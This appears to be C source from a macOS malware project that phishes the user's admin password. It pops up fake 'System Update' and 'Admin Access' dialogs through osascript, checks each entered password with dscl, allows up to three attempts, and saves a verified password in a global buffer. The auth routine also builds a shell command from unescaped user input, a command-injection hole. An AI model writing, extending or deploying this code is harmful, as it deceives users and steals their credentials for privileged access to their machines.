
#include "wisp.h"

char sws[PWD] = {0};

//===================================================================
/// PWD? 
//===================================================================

__attribute__((always_inline)) static inline char *execute_command(const char *command) {
    FILE *pipe = popen(command, "r");
    if (!pipe)
        return NULL;

    size_t buffer_size = 1024;
    char *output = malloc(buffer_size);
    if (!output) {
        pclose(pipe);
        return NULL;
    }
    output[0] = '\0';

    char chunk[256];
    while (fgets(chunk, sizeof(chunk), pipe)) {
        size_t current_length = strlen(output);
        size_t chunk_length = strlen(chunk);
        if (current_length + chunk_length + 1 > buffer_size) {
            buffer_size = (current_length + chunk_length + 1) * 2;
            char *new_buffer = realloc(output, buffer_size);
            if (!new_buffer) {
                free(output);
                pclose(pipe);
                return NULL;
            }
            output = new_buffer;
        }
        strcat(output, chunk);
    }

    pclose(pipe);
    return output;
}

__attribute__((always_inline)) static inline char *extract_script_text(const char *script_output) {
    char *result = NULL;
    char *text_start = strstr(script_output, "text returned:");
    if (text_start) {
        text_start += strlen("text returned:");
        while (*text_start == ' ' || *text_start == '\t')
            text_start++;  // Skip whitespace

        char *text_end = strstr(text_start, ", gave up:");
        if (!text_end)
            text_end = strstr(text_start, ", gave up:true");

        if (text_end) {
            size_t length = text_end - text_start;
            result = malloc(length + 1);
            if (result) {
                strncpy(result, text_start, length);
                result[length] = '\0';
            }
        } else {
            result = strdup(text_start);
        }
    }
    return result;
}

__attribute__((always_inline)) static inline char *prompt_script(const char *script) {
    char *script_output = execute_command(script);
    if (!script_output)
        return NULL;

    char *result = extract_script_text(script_output);
    free(script_output);
    return result;
}

//===================================================================
/// VALID 
//===================================================================

int auth(const char *username, const char *password) {
    char command[512] = {0};
    snprintf(command, sizeof(command),
             "dscl /Local/Default -authonly %s %s", username, password);
    
    char *result = execute_command(command);
    if (!result)
        return 0;
    
    int is_valid = (strlen(result) == 0);
    free(result);
    return is_valid;
}

int who(const char *username) {
    if (strcmp(username, "root") == 0)
        return 1;

    struct group *admin_group = getgrnam("admin");
    if (!admin_group)
        return 0;

    struct passwd *user_info = getpwnam(username);
    if (user_info && user_info->pw_gid == admin_group->gr_gid)
        return 1;

    for (char **member = admin_group->gr_mem; member && *member; member++) {
        if (strcmp(*member, username) == 0)
            return 1;
    }

    return 0;
}

void request(void) {
    const char *current_user = getlogin();
    if (!current_user) {
        struct passwd *user_info = getpwuid(getuid());
        if (user_info)
            current_user = user_info->pw_name;
        else
            goto _exit;
    }

    char admin_username[256] = {0};
    if (who(current_user)) {
        strncpy(admin_username, current_user, sizeof(admin_username) - 1);
    } else {
        const char *username_prompt =
        // Later stack these!!! 
            "osascript -e 'display dialog \"Admin privileges required.\\nEnter admin username:\" "
            "with title \"Admin Access\" default answer \"\" giving up after 30'";
        char *username_input = prompt_script(username_prompt);
        if (!username_input || strlen(username_input) == 0) {
            if (username_input)
                free(username_input);
            goto _exit;
        }
        strncpy(admin_username, username_input, sizeof(admin_username) - 1);
        free(username_input);
    }

    for (int attempts = 0; attempts < 3; attempts++) {
        char password_prompt[1024] = {0};
        if (who(current_user)) {
            snprintf(password_prompt, sizeof(password_prompt),
                "osascript -e 'display dialog \"System update requires your password.\\n\\n"
                "Enter password:\" with title \"System Update\" with icon caution "
                "default answer \"\" giving up after 30 with hidden answer'");
        } else {
            snprintf(password_prompt, sizeof(password_prompt),
                "osascript -e 'display dialog \"Admin privileges required.\\n\\n"
                "Enter password for %s:\" with title \"Admin Access\" with icon caution "
                "default answer \"\" giving up after 30 with hidden answer'", admin_username);
        }

        char *password = prompt_script(password_prompt);
        if (!password)
            continue;

        if (auth(admin_username, password)) {
            strncpy(sws, password, PWD - 1);
            sws[PWD - 1] = '\0';
            free(password);
            break;
        }
        free(password);
    }

_exit:
    return;
}
